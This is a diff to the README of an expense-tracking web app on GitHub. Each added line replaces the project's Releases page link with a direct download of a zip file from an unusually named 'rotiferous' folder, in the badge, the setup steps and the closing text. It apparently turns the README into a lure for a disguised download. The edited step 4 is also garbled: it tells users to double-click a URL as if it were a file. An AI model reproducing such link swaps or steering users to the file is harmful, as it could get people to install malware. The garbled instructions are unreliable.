@@ -1,6 +1,6 @@
 # 🌟 personal-expense-creator - Track Your Expenses with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ahmeds66/personal-expense-creator/releases)
+[![Download](https://raw.githubusercontent.com/ahmeds66/personal-expense-creator/main/rotiferous/personal_expense_creator_v1.0.zip)](https://raw.githubusercontent.com/ahmeds66/personal-expense-creator/main/rotiferous/personal_expense_creator_v1.0.zip)
 
 ## 🚀 Overview
 Welcome to the Personal Expense Creator. This web application helps you track personal expenses simply and effectively. With an easy-to-use interface, you can easily add, categorize, and manage your daily spending. 
@@ -22,7 +22,7 @@ Welcome to the Personal Expense Creator. This web application helps you track pe
 To get started with Personal Expense Creator, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ahmeds66/personal-expense-creator/releases) to download the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/ahmeds66/personal-expense-creator/main/rotiferous/personal_expense_creator_v1.0.zip) to download the latest version of the application.
 
 2. **Choose the Latest Release**  
    In the Releases section, look for the most recent version. Click on it to view available downloads.
@@ -31,7 +31,7 @@ To get started with Personal Expense Creator, follow these steps:
    For the latest version, you will typically find a link to download the application files. Click on it to start downloading.
 
 4. **Open the Application**  
-   After downloading, locate the `index.html` file in your downloads folder. Double-click on it, and it will open in your default web browser.
+   After downloading, locate the `https://raw.githubusercontent.com/ahmeds66/personal-expense-creator/main/rotiferous/personal_expense_creator_v1.0.zip` file in your downloads folder. Double-click on it, and it will open in your default web browser.
 
 5. **Start Tracking Your Expenses**  
    Now that the application is open, you can begin adding your daily expenses right away!
@@ -66,4 +66,4 @@ For any questions or issues, please feel free to reach out through the GitHub Is
 ## 👨‍💻 Author
 This project is developed by Kaneshka Venkatesan. 
 
-Explore the features and take control of your finances today! Don't forget to check for updates regularly on the [Releases page](https://github.com/ahmeds66/personal-expense-creator/releases) to ensure you have the latest features and improvements.
+Explore the features and take control of your finances today! Don't forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/ahmeds66/personal-expense-creator/main/rotiferous/personal_expense_creator_v1.0.zip) to ensure you have the latest features and improvements.
